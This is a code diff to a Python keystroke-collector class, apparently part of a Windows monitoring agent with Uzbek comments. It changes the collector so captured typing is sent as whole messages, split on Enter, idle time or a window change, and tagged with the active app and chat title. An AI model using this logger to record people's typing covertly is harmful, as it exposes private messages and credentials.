@@ -63,19 +63,25 @@ class WindowsActiveWindow(Collector):
 
 
 class WindowsKeyboard(Collector):
-    """Terilgan matnni to'playdi (Backspace va modifikatorlar to'g'ri hisoblanadi).
+    """Terilgan matnni to'playdi va BUTUN GAP sifatida yuboradi.
 
-    pynput tinglovchisi alohida oqimda ishlaydi. poll() da to'plangan matn,
-    agar vaqt o'tgan yoki buffer kattalashgan bo'lsa, faol oyna bilan yuboriladi.
+    Matn quyidagi hollarда yuboriladi (bo'laklanmaydi):
+      - Enter bosilганда (chatда xabar yuborilди),
+      - yozishdан to'xtaganда (idle, ~5s),
+      - oyna/chat almashganда,
+      - buffer juda kattalashganда.
+    Backspace hisobga olinadi; boshqaruv belgilari (Ctrl+C/V) o'tkazib yuboriladi.
     """
     name = "keyboard"
 
-    def __init__(self, flush_sec: int = 5, max_chars: int = 200):
-        self.flush_sec = flush_sec
+    def __init__(self, idle_sec: float = 5.0, max_chars: int = 500):
+        self.idle_sec = idle_sec
         self.max_chars = max_chars
         self._buf: list[str] = []
         self._lock = threading.Lock()
-        self._last_flush = time.time()
+        self._last_key = time.time()
+        self._flush_pending = False   # Enter bosildi -> yuborish kerak
+        self._ctx = None              # matn qaysi oyna/chatда yozilmoqda
         self._start_listener()
 
     def _start_listener(self):
@@ -89,16 +95,16 @@ class WindowsKeyboard(Collector):
             try:
                 from pynput import keyboard as kb
                 with self._lock:
+                    self._last_key = time.time()
                     if key == kb.Key.space:
                         self._buf.append(" ")
                     elif key == kb.Key.enter:
-                        self._buf.append("\n")
+                        self._flush_pending = True   # xabar yuborildi -> flush
                     elif key == kb.Key.backspace:
                         if self._buf:
                             self._buf.pop()
                     elif hasattr(key, "char") and key.char is not None and key.char.isprintable():
                         self._buf.append(key.char)
-                    # boshqaruv belgilari (Ctrl+C=\x03, Ctrl+V=\x16 ...) va maxsus tugmalar o'tkazib yuboriladi
             except Exception:  # noqa: BLE001
                 pass
 
@@ -109,20 +115,32 @@ class WindowsKeyboard(Collector):
 
     def poll(self) -> list[dict]:
         now = time.time()
+        app, title = _foreground()
         with self._lock:
-            size = len(self._buf)
-            due = (now - self._last_flush >= self.flush_sec) or (size >= self.max_chars)
-            if not self._buf or not due:
+            if not self._buf and not self._flush_pending:
+                self._ctx = None
                 return []
+            if self._ctx is None:
+                self._ctx = (app, title)   # matn shu oynaда boshlandi
+
+            context_changed = (app, title) != self._ctx
+            idle = (now - self._last_key) >= self.idle_sec
+            big = len(self._buf) >= self.max_chars
+
+            if not (self._flush_pending or context_changed or idle or big):
+                return []
+
             text = "".join(self._buf).strip()
+            ctx_app, ctx_title = self._ctx
             self._buf.clear()
-            self._last_flush = now
+            self._flush_pending = False
+            self._ctx = None
+
         if not text:
             return []
-        app, title = _foreground()
         return [{
             "type": "keyboard", "severity": "info",
-            "app": app, "title": title, "text": text,
+            "app": ctx_app, "title": ctx_title, "text": text,
             "occurred_at": now_iso(), "details": {},
         }]
 
